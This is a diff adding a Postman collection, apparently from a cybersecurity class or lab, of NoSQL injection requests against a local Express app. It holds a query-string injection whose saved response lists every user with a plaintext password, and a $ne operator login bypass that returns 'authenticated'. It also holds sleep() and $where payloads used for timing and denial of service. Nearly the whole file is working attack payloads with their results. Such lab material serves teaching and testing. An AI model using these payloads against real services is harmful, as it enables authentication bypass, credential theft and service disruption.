@@ -1,0 +1,267 @@
+{
+	"info": {
+		"_postman_id": "73717f2f-2915-4a1e-b33c-794dc3a68526",
+		"name": "Ciberseguridad NOSQL injection",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "injection username",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:3000/users?username=' || 'a'=='a",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"users"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "' || 'a'=='a"
+						}
+					]
+				}
+			},
+			"response": [
+				{
+					"name": "injection username",
+					"originalRequest": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:3000/users?username=' || 'a'=='a",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "3000",
+							"path": [
+								"users"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "' || 'a'=='a"
+								}
+							]
+						}
+					},
+					"status": "OK",
+					"code": 200,
+					"_postman_previewlanguage": "json",
+					"header": [
+						{
+							"key": "X-Powered-By",
+							"value": "Express"
+						},
+						{
+							"key": "Content-Type",
+							"value": "application/json; charset=utf-8"
+						},
+						{
+							"key": "Content-Length",
+							"value": "220"
+						},
+						{
+							"key": "ETag",
+							"value": "W/\"dc-BE5uGvphlys52kER7sqwsqplBZg\""
+						},
+						{
+							"key": "Date",
+							"value": "Sun, 11 Apr 2021 02:18:48 GMT"
+						},
+						{
+							"key": "Connection",
+							"value": "keep-alive"
+						}
+					],
+					"cookie": [],
+					"body": "[\n    {\n        \"_id\": \"60721ee00d1cb3bc1f24abd9\",\n        \"username\": \"andres\",\n        \"password\": \"1234\"\n    },\n    {\n        \"_id\": \"60722e690d1cb3bc1f24abda\",\n        \"username\": \"felipe\",\n        \"password\": \"2343\"\n    },\n    {\n        \"_id\": \"60722e740d1cb3bc1f24abdb\",\n        \"username\": \"pedro\",\n        \"password\": \"adada\"\n    }\n]"
+				}
+			]
+		},
+		{
+			"name": "injection $ne",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"username\":\"andres\",\r\n    \"password\":{\"$ne\":1}\r\n\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:3000/auth",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"auth"
+					]
+				}
+			},
+			"response": [
+				{
+					"name": "New Request",
+					"originalRequest": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"username\":\"andres\",\r\n    \"password\":{\"$ne\":1}\r\n\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "http://localhost:3000/auth",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "3000",
+							"path": [
+								"auth"
+							]
+						}
+					},
+					"status": "OK",
+					"code": 200,
+					"_postman_previewlanguage": "json",
+					"header": [
+						{
+							"key": "X-Powered-By",
+							"value": "Express"
+						},
+						{
+							"key": "Content-Type",
+							"value": "application/json; charset=utf-8"
+						},
+						{
+							"key": "Content-Length",
+							"value": "43"
+						},
+						{
+							"key": "ETag",
+							"value": "W/\"2b-l1Drzr8vi6rZ1qvSc2RYDVrfk9Q\""
+						},
+						{
+							"key": "Date",
+							"value": "Sun, 11 Apr 2021 02:37:30 GMT"
+						},
+						{
+							"key": "Connection",
+							"value": "keep-alive"
+						}
+					],
+					"cookie": [],
+					"body": "{\n    \"username\": \"andres\",\n    \"msg\": \"authenticated\"\n}"
+				}
+			]
+		},
+		{
+			"name": "SLEEP",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:3000/products?name='1==1;sleep(5000)'",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"products"
+					],
+					"query": [
+						{
+							"key": "name",
+							"value": "'1==1;sleep(5000)'"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "DOS",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": null
+			},
+			"response": [
+				{
+					"name": "New Request",
+					"originalRequest": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:3000/products?$where=sleep(1000)",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "3000",
+							"path": [
+								"products"
+							],
+							"query": [
+								{
+									"key": "$where",
+									"value": "sleep(1000)"
+								}
+							]
+						}
+					},
+					"status": "OK",
+					"code": 200,
+					"_postman_previewlanguage": "json",
+					"header": [
+						{
+							"key": "X-Powered-By",
+							"value": "Express"
+						},
+						{
+							"key": "Content-Type",
+							"value": "application/json; charset=utf-8"
+						},
+						{
+							"key": "Content-Length",
+							"value": "92"
+						},
+						{
+							"key": "ETag",
+							"value": "W/\"5c-2pOW6IWn0/85E0JbqjD2NhbwCCA\""
+						},
+						{
+							"key": "Date",
+							"value": "Sun, 11 Apr 2021 01:37:20 GMT"
+						},
+						{
+							"key": "Connection",
+							"value": "keep-alive"
+						}
+					],
+					"cookie": [],
+					"body": "{\n    \"initDate\": \"2021-04-11T01:37:17.153Z\",\n    \"finalDate\": \"2021-04-11T01:37:20.164Z\",\n    \"products\": []\n}"
+				}
+			]
+		}
+	]
+}
